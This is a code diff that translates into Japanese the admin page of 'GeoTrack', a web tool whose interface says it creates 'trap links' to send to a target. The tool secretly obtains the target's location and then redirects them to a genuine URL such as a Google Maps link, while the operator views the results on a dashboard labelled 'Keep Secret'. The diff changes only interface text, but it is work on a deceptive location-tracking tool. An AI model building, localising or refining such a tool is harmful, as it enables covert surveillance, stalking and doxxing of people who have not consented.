@@ -45,15 +45,15 @@ export default function AdminPage() {
             <div className="bg-white rounded-2xl shadow-xl w-full max-w-lg overflow-hidden border border-gray-100">
                 <div className="bg-blue-600 p-6 text-white text-center">
                     <GlobeAltIcon className="w-12 h-12 mx-auto mb-2 text-blue-200" />
-                    <h1 className="text-2xl font-bold tracking-tight">GeoTrack Admin</h1>
-                    <p className="text-blue-200 text-sm mt-1">Create intelligent trap links</p>
+                    <h1 className="text-2xl font-bold tracking-tight">GeoTrack ツール管理画面</h1>
+                    <p className="text-blue-200 text-sm mt-1">トラップリンクの生成・管理を行います</p>
                 </div>
 
                 <div className="p-8">
                     <form onSubmit={handleGenerate} className="space-y-6">
                         <div>
                             <label htmlFor="url" className="block text-sm font-medium text-gray-700 mb-2">
-                                Target URL
+                                ターゲットURL (本物のURL)
                             </label>
                             <div className="relative">
                                 <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
@@ -63,14 +63,14 @@ export default function AdminPage() {
                                     type="url"
                                     id="url"
                                     required
-                                    placeholder="https://maps.google.com/..."
+                                    placeholder="https://maps.app.goo.gl/..."
                                     className="block w-full pl-10 pr-3 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors shadow-sm"
                                     value={targetUrl}
                                     onChange={(e) => setTargetUrl(e.target.value)}
                                 />
                             </div>
                             <p className="mt-2 text-xs text-gray-500">
-                                The URL the user will be redirected to after we extract their data.
+                                位置情報を取得した後に、相手をリダイレクトさせる（飛ばす）本物のURLを入力してください。
                             </p>
                         </div>
 
@@ -86,10 +86,10 @@ export default function AdminPage() {
                                         <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                         <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                     </svg>
-                                    Generating...
+                                    生成中...
                                 </span>
                             ) : (
-                                'Generate Trap Link'
+                                'トラップリンクを生成'
                             )}
                         </button>
                     </form>
@@ -98,14 +98,14 @@ export default function AdminPage() {
                         <div className="mt-8 p-5 bg-blue-50 rounded-xl border border-blue-100 animate-fade-in-up">
                             <h3 className="text-sm font-bold text-blue-900 mb-4 flex items-center">
                                 <MapPinIcon className="w-5 h-5 mr-2" />
-                                Links successfully generated!
+                                リンクの生成が完了しました！
                             </h3>
 
                             <div className="space-y-4">
                                 {/* Trap Link */}
                                 <div>
                                     <label className="block text-xs font-semibold text-blue-800 uppercase tracking-wider mb-1">
-                                        Trap Link (Send to Target)
+                                        トラップリンク （相手に送る用URL）
                                     </label>
                                     <div className="flex items-center">
                                         <input
@@ -127,7 +127,7 @@ export default function AdminPage() {
                                 {/* Result Link */}
                                 <div>
                                     <label className="block text-xs font-semibold text-emerald-800 uppercase tracking-wider mb-1">
-                                        Result Dashboard (Keep Secret)
+                                        結果ダッシュボード （自分が見る用URL）
                                     </label>
                                     <div className="flex items-center">
                                         <input
